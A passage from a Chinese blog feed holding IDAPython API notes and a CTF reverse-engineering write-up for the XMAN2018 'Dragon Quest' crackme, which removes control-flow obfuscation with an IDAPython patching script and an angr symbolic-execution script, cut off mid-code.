class="hljs-built_in">print</span>()<br>    <br>    <span class="hljs-keyword">for</span> succ <span class="hljs-keyword">in</span> blocks.succs(): <span class="hljs-comment"># 每一个block的后继</span><br>        <span class="hljs-built_in">print</span>(succ.start_ea)<br>        <span class="hljs-built_in">print</span>(succ.end_ea)<br>        <br>   <span class="hljs-keyword">for</span> pred <span class="hljs-keyword">in</span> blocks.preds() <span class="hljs-comment"># 每一个block的前驱</span><br>  <span class="hljs-built_in">print</span>(pred.start_ea)<br>        <span class="hljs-built_in">print</span>(pred.end_ea)<br><br></code></pre></td></tr></table></figure><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">idc.get_wide_byte(ea) // 获取单字节<br>idc.get_wide_word(ea) // 获取一个字<br>idc.get_wide_dword(ea) // 获取双字<br>idc.get_qword(ea) // 获取四字<br>idc.GetFloat(ea) <br>idc.GetDouble(ea)<br></code></pre></td></tr></table></figure><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">patch_byte(ea, value)<br>patch_word(ea, value)<br>patch_dword(ea, value)<br>patch_qword(ea, value)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>IDApython</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>idapython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XMAN2018 排位赛 Dragon Quest</title>
    <link href="/2023/06/02/wyvern/"/>
    <url>/2023/06/02/wyvern/</url>
    
    <content type="html"><![CDATA[<p>记录一道十分nice的题目</p><span id="more"></span><p>我觉得这道题出得十分得好，它采取了较为简单的控制流混淆，可以使用angr恢复出原本的逻辑，也可以用idapython直接patch去混淆，当然也可以直接使用angr跑出flag，但这样就失去了这题本身的意义了。</p><h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><p>这题采取的是控制流混淆，也就是增加一些无关紧要的变量，以这些变量之间的稀奇古怪的运算作为控制条件，再在各个块中跳来跳去。</p><p>以这题中一个关键函数<code>start_quest</code> 来看，可以发现里面有很多<code>y26 &gt;= 10 &amp;&amp; (x25-1) * (x25 &amp; 1) !=0</code>等诸如此类的控制条件，并且反复出现相同的语句去控制。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306021959458.png" alt="1.png"></p><p>再看看它的CFG</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306022006460.png" alt="3.png"></p><p>给人的感觉就是冗长、繁琐。然而相比于它的大哥控制流平坦化，这还是比较友好的。</p><h3 id="去混淆"><a href="#去混淆" class="headerlink" title="去混淆"></a>去混淆</h3><h4 id="思路一-IDApython"><a href="#思路一-IDApython" class="headerlink" title="思路一 IDApython"></a>思路一 IDApython</h4><p>我们知道了这道题是以一些无关变量来操控控制流，以达到混淆目的。很自然的一个想法就是，如果这些变量的值都不会变，那么控制语句的结果不就是唯一确定的吗。于是乎，我们想到去查看这些变量的定义位置，会惊奇的发现，它们全部都在bss段定义！</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306022013016.png" alt="4.png"></p><p>我们再交叉引用几个变量，又会惊奇地发现，它们的值全都没有发生改变。</p><p>也就是说，那些控制语句的结果就是唯一的！可是这样子的话，那么IDA就应该能分析出来并优化掉那些不可达语句。然而事实很明朗，并没有。原因在于，在IDA眼中，这些仍然是变量，只不过是不会变的变量。</p><p>那么这就有了第一个patch思路，也就是我们手动帮助IDA识别，即把所有的这些变量全部patch成0。比如说原本是<code>mov eax,y26</code>，那么我们就patch成<code>mov eax,0</code>。可能会想到，那这么多的变量，我得patch到啥时候呀？这个情况下，我们就应该想到可以借助IDApython来帮我们完成，毕竟 <em>重复性</em> 的工作是计算机最擅长的。</p><p>直接上脚本，脚本中会有详细注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ida_xref<br><br><span class="hljs-comment"># 变量位于bss段的起始地址以及终止地址</span><br>ea = <span class="hljs-number">0x610318</span><br>end = <span class="hljs-number">0x6105A8</span><br>regs = <span class="hljs-built_in">set</span>()<br><br><span class="hljs-comment"># mov 寄存器,0 对应的机器码，可以在IDA中利用Assemble一句一句试出来</span><br>pad = <span class="hljs-string">b&#x27;\x90\x90&#x27;</span><br>patch = &#123;<span class="hljs-string">&#x27;eax&#x27;</span>:<span class="hljs-string">b&#x27;\xB8\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;ebx&#x27;</span>:<span class="hljs-string">b&#x27;\xBB\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;ecx&#x27;</span>:<span class="hljs-string">b&#x27;\xB9\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;edx&#x27;</span>:<span class="hljs-string">b&#x27;\xBA\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;esi&#x27;</span>:<span class="hljs-string">b&#x27;\xBE\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;edi&#x27;</span>:<span class="hljs-string">b&#x27;\xBF\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r8d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xB8\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r9d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xB9\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r10d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBA\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r11d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBB\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r12d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBC\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r13d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBD\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r14d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBE\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r15d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBF\x00\x00\x00\x00&#x27;</span> + pad&#125;<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">如何确定只有这些寄存器？ </span><br><span class="hljs-string">当然也是使用IDApython 可以先在下面的reg =idc.print_operand(ref,0)后追加</span><br><span class="hljs-string">regs.add(reg)</span><br><span class="hljs-string">最后再print(regs)就可以得到了</span><br><span class="hljs-string"></span><br><span class="hljs-string">为什么要加一个pad？</span><br><span class="hljs-string">可以自己手动patch一两个，看看patch后和patch前长度有啥区别就知道了</span><br><span class="hljs-string"></span><br><span class="hljs-string">确实 按道理来说 这些应该也有规律的 可以使用脚本来表示的，而非字典</span><br><span class="hljs-string">但是 我不会:(</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 变量存储地址每次递增4</span><br><span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ea,end,<span class="hljs-number">4</span>):<br>     ref = ida_xref.get_first_dref_to(addr)<span class="hljs-comment"># 得到是引用此变量的首语句地址</span><br>     <span class="hljs-keyword">while</span> ref != idaapi.BADADDR:<span class="hljs-comment"># 与最后一句一起配合使用，即当前变量仍有被索引</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;mov&#x27;</span> <span class="hljs-keyword">in</span> GetDisasm(ref):<span class="hljs-comment"># 转为反汇编，确认是不是mov操作</span><br>            reg =idc.print_operand(ref,<span class="hljs-number">0</span>)<span class="hljs-comment"># 得到第一个操作数，如果把0改为1，就是得到第二个操作数。这里是获得操作的寄存器</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;before:&quot;</span>,GetDisasm(ref))<span class="hljs-comment"># patch前语句</span><br>            idaapi.patch_bytes(ref,patch[reg])<span class="hljs-comment"># 从此语句开始patch，patch值为以上字典所示</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,GetDisasm(ref))<span class="hljs-comment"># patch后语句</span><br>        ref = ida_xref.get_next_dref_to(addr,ref)<span class="hljs-comment"># 得到引用此变量的下一条语句地址 若没有 则返回 -1</span><br><br></code></pre></td></tr></table></figure><p>patch完成之后，CFG还是那个CFG，但是反编译已经成功去混淆了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">start_quest</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *a1)</span><br>&#123;<br>  _BYTE v2[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-90h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+48h] [rbp-48h]</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *v5; <span class="hljs-comment">// [rsp+50h] [rbp-40h]</span><br>  <span class="hljs-type">int</span> *v6; <span class="hljs-comment">// [rsp+58h] [rbp-38h]</span><br>  _BYTE *v7; <span class="hljs-comment">// [rsp+60h] [rbp-30h]</span><br>  _BYTE *v8; <span class="hljs-comment">// [rsp+68h] [rbp-28h]</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *v9; <span class="hljs-comment">// [rsp+70h] [rbp-20h]</span><br><br>  v9 = a1;<br>  v8 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v7 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v6 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v5 = &amp;v2[<span class="hljs-number">-16</span>];<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_100);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_214);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_266);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_369);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_417);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_527);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_622);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_733);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_847);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_942);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1054);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1106);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1222);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1336);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1441);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1540);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1589);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1686);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1796);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1891);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1996);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2112);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2165);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2260);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2336);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2412);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2498);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2575);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::length(v9) - <span class="hljs-number">1LL</span> != legend &gt;&gt; <span class="hljs-number">2</span> )<br>  &#123;<br>    *v6 = legend &gt;&gt; <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-built_in">string</span>(v5, v9);<br>    v3 = sanitize_input(v5);<br>    *v6 = v3;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::~<span class="hljs-built_in">string</span>(v5);<br>  &#125;<br>  <span class="hljs-keyword">return</span> *v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>会发现，代码逻辑已经十分清晰了。</p><h4 id="思路二-Angr符号执行"><a href="#思路二-Angr符号执行" class="headerlink" title="思路二 Angr符号执行"></a>思路二 Angr符号执行</h4><p>前面提即，那些控制变量的条件是确定的，也就是哪些走、哪些地方不走是确定，如果我们可以直接把不走的地方给nop掉，不也可达到去混淆的目的吗？</p><p>那问题在于，我们如何确定哪些块该走，哪些块不该走呢？ IDApython或许也可以一试，毕竟这也是重复性的活，不过这时候规律性就没那么明显了，脚本就不是很好写了。但是我们还有Angr这一个帮手呀，它不就是一步一步帮我们探索嘛，那只要把它没有走到的块给nop掉不就好了嘛</p><p>直接看脚本吧，脚本附有详细注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 用于记录所有的块</span><br>Blocks = <span class="hljs-built_in">set</span>()<br><br><span class="hljs-comment"># 得到CFG，但注意此处的CFG是函数调用CFG，也即一个Call会是一个block的终止，与IDA的CFG有所不同，但无伤大雅</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GetCFG</span>(<span class="hljs-params">func_addr</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Getting CFG&quot;</span>)<br>    cfg = proj.analyses.CFGFast(normalize = <span class="hljs-literal">True</span>,force_complete_scan = <span class="hljs-literal">False</span>)<span class="hljs-comment"># 使用CFGFast得到静态CFG</span><br>    function_cfg = cfg.functions.get(func_addr).transition_graph<span class="hljs-comment"># 得到函数调用CFG</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Getting CFG Done&quot;</span>)<br>    <span class="hljs-keyword">return</span> function_cfg<br><br><br><span class="hljs-comment"># 得到所有的块</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GetBlock</span>(<span class="hljs-params">cfg</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Getting Block &quot;</span>)<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> cfg.nodes:<br>        Blocks.add(node.addr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Getting Block Done&quot;</span>)<br><br>    <br><span class="hljs-comment"># Hook掉所有call的函数，让他们返回未约束的值，以免陷入复杂的库函数中</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Hook</span>(<span class="hljs-params">block</span>):<br>    <span class="hljs-keyword">for</span> insn <span class="hljs-keyword">in</span> block.capstone.insns: <span class="hljs-comment">#该块的所有汇编语句</span><br>        <span class="hljs-keyword">if</span> insn.mnemonic == <span class="hljs-string">&#x27;call&#x27;</span>:<span class="hljs-comment"># 汇编操作指令为 call 的</span><br>            src_Addr = <span class="hljs-built_in">int</span>(insn.op_str,<span class="hljs-number">16</span>)<span class="hljs-comment"># 得到操作数，即call的地址</span><br>            proj.hook(src_Addr,angr.SIM_PROCEDURES[<span class="hljs-string">&quot;stubs&quot;</span>][<span class="hljs-string">&quot;ReturnUnconstrained&quot;</span>](), replace=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-comment"># patch 无法执行的Block</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Patch</span>(<span class="hljs-params">block</span>):<br>    start = block.addr - proj.loader.main_object.mapped_base<br>    size = block.size<br>    oridata[start : start + size] = <span class="hljs-string">b&#x27;\x90&#x27;</span> * size<br>    <br><br><span class="hljs-comment"># 写入patch后的文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Write</span>(<span class="hljs-params">oridata</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Wtring File&quot;</span>)<br>    fname, suffix = os.path.splitext(file)<br>    newname = fname +<span class="hljs-string">&#x27;_patched&#x27;</span> + suffix<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(newname,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> newfile:<br>        newfile.write(oridata)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Wtring Done&quot;</span>)<br><br><span class="hljs-comment"># 符号执行找到不可达的Block</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deobfu_func</span>(<span class="hljs-params">func_addr</span>):<br>    state = proj.factory.blank_state(addr = func_addr)<br>    simgr = proj.factory.simgr(state)<br>    <span class="hljs-comment"># 采用step方式一步一步走，一直到终止</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(simgr.active):<br>        <span class="hljs-keyword">for</span> active <span class="hljs-keyword">in</span> simgr.active:<br>            <span class="hljs-comment">#把可以到达的block舍弃掉</span><br>            Blocks.discard(active.addr)<br>            <span class="hljs-comment">#把当前active转为block，并Hook掉里面的call函数</span><br>            block = proj.factory.block(active.addr)<br>            Hook(block)<br>        simgr.step()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Patching&quot;</span>)<br>    <span class="hljs-comment">#此时仍在Blocks里面的，即为不可执行块，patch掉</span><br>    <span class="hljs-keyword">for</span> block_addr <span class="hljs-keyword">in</span> Blocks:<br>        Patch(proj.factory.block(block_addr))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Patching Done&quot;</span>)<br>    <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 准备一些必要参数 文件地址 以及 去混淆的起始地址</span><br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&#x27;-f&#x27;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;File to deobfuscate&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--start&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">int</span>(x, <span class="hljs-number">0</span>), <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Starting address of target function&#x27;</span>)<br>    args = parser.parse_args()<br><br>    file = args.file<br>    start = args.start<br>    <br><span class="hljs-comment">#装载二进制文件</span><br>    proj = angr.Project(file,auto_load_libs=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-comment">#获得原来的二进制数据 为patch做准备</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> orifile:<br>        oridata = <span class="hljs-built_in">bytearray</span>(orifile.read())<br><br>    func_cfg = GetCFG(start)<br>    GetBlock(func_cfg)<br>    deobfu_func(start)<br><br>    Write(oridata)<br><br></code></pre></td></tr></table></figure><p>值得注意的是，每符号执行一次，只能清除一个函数的混淆，如果有多个函数需要清楚混淆，就要重复执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">start_quest</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *a1)</span><br>&#123;<br>  _BYTE v2[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-90h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+48h] [rbp-48h]</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *v5; <span class="hljs-comment">// [rsp+50h] [rbp-40h]</span><br>  <span class="hljs-type">int</span> *v6; <span class="hljs-comment">// [rsp+58h] [rbp-38h]</span><br>  _BYTE *v7; <span class="hljs-comment">// [rsp+60h] [rbp-30h]</span><br>  _BYTE *v8; <span class="hljs-comment">// [rsp+68h] [rbp-28h]</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *v9; <span class="hljs-comment">// [rsp+70h] [rbp-20h]</span><br><br>  v9 = a1;<br>  v8 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v7 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v6 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v5 = &amp;v2[<span class="hljs-number">-16</span>];<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_100);<br>  <span 